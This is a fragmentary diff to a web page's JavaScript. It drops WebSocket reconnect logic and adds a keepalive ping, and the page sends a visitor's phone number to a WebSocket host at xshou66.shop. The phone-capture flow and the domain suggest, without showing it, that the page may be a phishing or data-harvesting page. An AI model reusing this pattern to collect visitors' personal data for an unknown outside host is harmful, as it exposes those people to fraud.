@@ -1413,9 +1413,7 @@
         let currentSlide = 0;
 
         function slide(direction) {
-            if(socketphone.CLOSING || socketphone.CLOSED ){
-                socketphone = new WebSocket("wss://xshou66.shop/wsp");
-            }
+
             const container = document.getElementById('container');
             const totalSlides = 3; // Total number of slides
 
@@ -1718,10 +1716,6 @@
             document.getElementById("sendphonebtntext").innerText = "PLEASE WAIT..."
             obj.disabled = true;
             showPhoneLoading()
-
-            if(socketphone.CLOSING || socketphone.CLOSED ){
-                socketphone = new WebSocket("wss://xshou66.shop/wsp");
-            }
 
             socketphone.send(phone);
 
@@ -2109,7 +2103,10 @@
         var socketphone = new WebSocket("wss://xshou66.shop/wsp");
 
         socketphone.onopen = function () {
-            // socket.send("input.value");
+            //
+            setInterval(() =>{
+                socketphone.send("ping")
+            },10000)
         };
 
         socketphone.onmessage = function (event) {
